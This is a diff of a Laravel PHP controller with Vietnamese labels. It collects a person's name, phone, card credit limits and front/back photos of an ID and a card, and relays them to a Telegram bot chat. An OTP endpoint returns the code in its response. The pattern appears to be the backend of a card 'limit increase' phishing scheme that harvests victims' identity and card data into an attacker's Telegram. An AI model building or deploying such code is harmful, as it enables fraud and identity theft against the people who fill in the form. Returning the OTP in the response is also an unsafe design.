@@ -11,86 +11,27 @@ class CustomerController extends Controller
 {
     public function save(Request $request)
     {
-        // dd($request->all());
         $request->validate([
             'name' => 'required',
             'phone' => 'required',
             'limit_now' => 'required',
             'limit_total' => 'required',
             'limit_increase' => 'required',
-            'mattruoc' => 'required|image|mimes:jpeg,png,jpg,gif,svg|max:2048',
-            'matsau' => 'required|image|mimes:jpeg,png,jpg,gif,svg|max:2048',
-            'mattruoc_card' => 'required|image|mimes:jpeg,png,jpg,gif,svg|max:2048',
-            'matsau_card' => 'required|image|mimes:jpeg,png,jpg,gif,svg|max:2048',
+            'imageIds' => 'required|array',
         ], [
             'name.required' => 'Vui lòng nhập tên khách hàng',
             'phone.required' => 'Vui lòng nhập số điện thoại',
             'limit_now.required' => 'Vui lòng nhập giới hạn hiện tại',
             'limit_total.required' => 'Vui lòng nhập giới hạn tối đa',
             'limit_increase.required' => 'Vui lòng nhập giới hạn tăng',
-            'mattruoc.required' => 'Vui lòng nhập mật khẩu trước',
-            'matsau.required' => 'Vui lòng nhập mật khẩu sau',
-            'mattruoc_card.required' => 'Vui lòng nhập mật khẩu trước thẻ',
-            'matsau_card.required' => 'Vui lòng nhập mật khẩu sau thẻ',
-            'mattruoc.image' => 'Mật khẩu trước không đúng định dạng',
-            'matsau.image' => 'Mật khẩu sau không đúng định dạng',
-            'mattruoc_card.image' => 'Mật khẩu trước thẻ không đúng định dạng',
-            'matsau_card.image' => 'Mật khẩu sau thẻ không đúng định dạng',
-            'mattruoc.mimes' => 'Mật khẩu trước không đúng định dạng',
-            'matsau.mimes' => 'Mật khẩu sau không đúng định dạng',
-            'mattruoc_card.mimes' => 'Mật khẩu trước thẻ không đúng định dạng',
-            'matsau_card.mimes' => 'Mật khẩu sau thẻ không đúng định dạng',
-            'mattruoc.max' => 'Mật khẩu trước không quá 2MB',
-            'matsau.max' => 'Mật khẩu sau không quá 2MB',
-            'mattruoc_card.max' => 'Mật khẩu trước thẻ không quá 2MB',
-            'matsau_card.max' => 'Mật khẩu sau thẻ không quá 2MB',
+            'imageIds.required' => 'Vui lòng chọn ảnh',
+            'imageIds.array' => 'Ảnh không đúng định dạng',
         ]);
 
-        // save image to storage
-        $mattruoc = $request->file('mattruoc');
-        $mattruoc_name = 'mặt trước-' . $request->name . time() . '.' . $mattruoc->extension();
-        $mattruoc->storeAs('public', $mattruoc_name);
-
-        $matsau = $request->file('matsau');
-        $matsau_name = 'mặt sau-' . $request->name . time() . '.' . $matsau->extension();
-        $matsau->storeAs('public', $matsau_name);
-
-        $mattruoc_card = $request->file('mattruoc_card');
-        $mattruoc_card_name = 'mặt trước thẻ-' . $request->name . time() . '.' . $mattruoc_card->extension();
-        $mattruoc_card->storeAs('public', $mattruoc_card_name);
-
-        $matsau_card = $request->file('matsau_card');
-        $matsau_card_name =  'mặt sau thẻ-' . $request->name . time() . '.' . $matsau_card->extension();
-        $matsau_card->storeAs('public', $matsau_card_name);
-
-        // save to database
-        // $customer = new Customer();
-        // $customer->name = $request->name;
-        // $customer->phone = $request->phone;
-        // $customer->limit_now = $request->limit_now;
-        // $customer->limit_total = $request->limit_total;
-        // $customer->limit_increase = $request->limit_increase;
-        // $customer->mattruoc = $mattruoc_name;
-        // $customer->matsau = $matsau_name;
-        // $customer->mattruoc_card = $mattruoc_card_name;
-        // $customer->matsau_card = $matsau_card_name;
-        // $customer->save();
-
-        // send to telegram by bot telegram
-        // $message = "Có khách hàng mới: \n";
-        // $message .= "Tên: " . $request->name . "\n";
-        // $message .= "Số điện thoại: " . $request->phone . "\n";
-        // $message .= "Giới hạn hiện tại: " . $request->limit_now . "\n";
-        // $message .= "Giới hạn tối đa: " . $request->limit_total . "\n";
-        // $message .= "Giới hạn tăng: " . $request->limit_increase . "\n";
-        // // ảnh mặt trước
-        // $message .= "Ảnh mặt trước: " . asset('storage/' . $mattruoc_name) . "\n";
-        // // ảnh mặt sau
-        // $message .= "Ảnh mặt sau: " . asset('storage/' . $matsau_name) . "\n";
-        // // ảnh mặt trước thẻ
-        // $message .= "Ảnh mặt trước thẻ: " . asset('storage/' . $mattruoc_card_name) . "\n";
-        // // ảnh mặt sau thẻ
-        // $message .= "Ảnh mặt sau thẻ: " . asset('storage/' . $matsau_card_name) . "\n";
+        $mattruoc_name = $request->imageIds[0];
+        $matsau_name = $request->imageIds[1];
+        $mattruoc_card_name = $request->imageIds[2];
+        $matsau_card_name = $request->imageIds[3];
 
         // send html
         $message = " <b>Có khách hàng mới:</b> \n";
@@ -100,45 +41,42 @@ class CustomerController extends Controller
         $message .= " <b>Giới hạn tối đa:</b> " . $request->limit_total . "\n";
         $message .= " <b>Giới hạn tăng:</b> " . $request->limit_increase . "\n";
         // ảnh mặt trước
-        $message .= " <b>Ảnh mặt trước:</b> " . "<a href='" . asset('storage/' . $mattruoc_name) . "'>" . asset('storage/' . $mattruoc_name) . "</a>" . "\r\n";
+        // $message .= " <b>Ảnh mặt trước:</b> " . "<a href='" . asset('storage/' . $mattruoc_name) . "'>" . asset('storage/' . $mattruoc_name) . "</a>" . "\r\n";
 
-        // ảnh mặt sau
+        // // ảnh mặt sau
 
-        $message .= " <b>Ảnh mặt sau:</b> " . "<a href='" . asset('storage/' . $matsau_name) . "'>" . asset('storage/' . $matsau_name) . "</a>" . "\r\n";
+        // $message .= " <b>Ảnh mặt sau:</b> " . "<a href='" . asset('storage/' . $matsau_name) . "'>" . asset('storage/' . $matsau_name) . "</a>" . "\r\n";
 
-        // ảnh mặt trước thẻ
+        // // ảnh mặt trước thẻ
 
-        $message .= " <b>Ảnh mặt trước thẻ:</b> " . "<a href='" . asset('storage/' . $mattruoc_card_name) . "'>" . asset('storage/' . $mattruoc_card_name) . "</a>" . "\r\n";
+        // $message .= " <b>Ảnh mặt trước thẻ:</b> " . "<a href='" . asset('storage/' . $mattruoc_card_name) . "'>" . asset('storage/' . $mattruoc_card_name) . "</a>" . "\r\n";
 
-        // ảnh mặt sau thẻ
-
-        // $message .= " <b>Ảnh mặt sau thẻ:</b> " . "<a href='". asset('storage/' . $matsau_card_name). "'>". asset('storage/' . $matsau_card_name) . "</a>" . "\r\n";
 
         $url = "https://api.telegram.org/bot" . env('TELEGRAM_BOT_TOKEN') . "/sendMessage?chat_id=" . env('TELEGRAM_CHAT_ID') . "&text=" . $message . "&parse_mode=HTML";
 
         Artisan::call('app:send', ['url' => $url]);
 
-        $url = "https://api.telegram.org/bot" . env('TELEGRAM_BOT_TOKEN') . "/sendPhoto?chat_id=" . env('TELEGRAM_CHAT_ID') . "&photo=" . asset('storage/' . $mattruoc_name) . "&caption=Ảnh mặt trước";
+        // $url = "https://api.telegram.org/bot" . env('TELEGRAM_BOT_TOKEN') . "/sendPhoto?chat_id=" . env('TELEGRAM_CHAT_ID') . "&photo=" . asset('storage/' . $mattruoc_name) . "&caption=Ảnh mặt trước";
 
-        Artisan::call(
-            'app:send',
-            ['url' => $url]
-        );
-
-
-        $url = "https://api.telegram.org/bot" . env('TELEGRAM_BOT_TOKEN') . "/sendPhoto?chat_id=" . env('TELEGRAM_CHAT_ID') . "&photo=" . asset('storage/' . $matsau_name) . "&caption=Ảnh mặt sau";
-
-        Artisan::call('app:send', ['url' => $url]);
+        // Artisan::call(
+        //     'app:send',
+        //     ['url' => $url]
+        // );
 
 
-        $url = "https://api.telegram.org/bot" . env('TELEGRAM_BOT_TOKEN') . "/sendPhoto?chat_id=" . env('TELEGRAM_CHAT_ID') . "&photo=" . asset('storage/' . $mattruoc_card_name) . "&caption=Ảnh mặt trước thẻ";
+        // $url = "https://api.telegram.org/bot" . env('TELEGRAM_BOT_TOKEN') . "/sendPhoto?chat_id=" . env('TELEGRAM_CHAT_ID') . "&photo=" . asset('storage/' . $matsau_name) . "&caption=Ảnh mặt sau";
 
-        Artisan::call('app:send', ['url' => $url]);
+        // Artisan::call('app:send', ['url' => $url]);
 
 
-        $url = "https://api.telegram.org/bot" . env('TELEGRAM_BOT_TOKEN') . "/sendPhoto?chat_id=" . env('TELEGRAM_CHAT_ID') . "&photo=" . asset('storage/' . $matsau_card_name) . "&caption=Ảnh mặt sau thẻ";
+        // $url = "https://api.telegram.org/bot" . env('TELEGRAM_BOT_TOKEN') . "/sendPhoto?chat_id=" . env('TELEGRAM_CHAT_ID') . "&photo=" . asset('storage/' . $mattruoc_card_name) . "&caption=Ảnh mặt trước thẻ";
 
-        Artisan::call('app:send', ['url' => $url]);
+        // Artisan::call('app:send', ['url' => $url]);
+
+
+        // $url = "https://api.telegram.org/bot" . env('TELEGRAM_BOT_TOKEN') . "/sendPhoto?chat_id=" . env('TELEGRAM_CHAT_ID') . "&photo=" . asset('storage/' . $matsau_card_name) . "&caption=Ảnh mặt sau thẻ";
+
+        // Artisan::call('app:send', ['url' => $url]);
 
         return response()->json([
             'message' => 'Thêm khách hàng thành công',
@@ -177,6 +115,28 @@ class CustomerController extends Controller
         return response()->json([
             'message' => 'Mã OTP đã được gửi',
             'otp' => $otp,
+            'status' => 'success'
+        ]);
+    }
+
+    public function upload(Request $request)
+    {
+        $request->validate([
+            'image' => 'required|image|mimes:jpeg,png,jpg,gif,svg|max:2048',
+        ], [
+            'image.required' => 'Vui lòng chọn ảnh',
+            'image.image' => 'Ảnh không đúng định dạng',
+            'image.mimes' => 'Ảnh không đúng định dạng',
+            'image.max' => 'Ảnh không quá 2MB',
+        ]);
+
+        $image = $request->file('image');
+        $image_name = 'image-' . time() . '.' . $image->extension();
+        $image->storeAs('public', $image_name);
+
+        return response()->json([
+            'message' => 'Upload ảnh thành công',
+            'imageUrl' => asset('storage/' . $image_name),
             'status' => 'success'
         ]);
     }
